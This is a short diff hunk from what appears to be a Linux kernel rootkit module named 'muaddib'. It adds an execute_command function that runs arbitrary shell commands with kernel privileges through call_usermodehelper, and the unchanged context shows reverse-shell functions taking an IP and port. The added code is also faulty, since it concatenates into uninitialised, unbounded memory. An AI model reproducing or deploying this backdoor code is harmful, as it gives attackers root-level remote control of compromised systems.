@@ -48,6 +48,19 @@ void execute_reverse_shell(struct work_struct *work){
 
 }
 
+void execute_command(char* command){
+    int err;
+    char *envp[] = {HOME, TERM, NULL};
+    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
+    char *argv[] = {SHELL, "-c", exec, NULL};
+    strcat(exec, command);
+    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if(err<0){
+        printk(KERN_INFO "muaddib: Error executing usermodehelper.\n");
+    }
+    kfree(exec);
+}
+
 int start_reverse_shell(char* ip, char* port){
     int err;
     struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
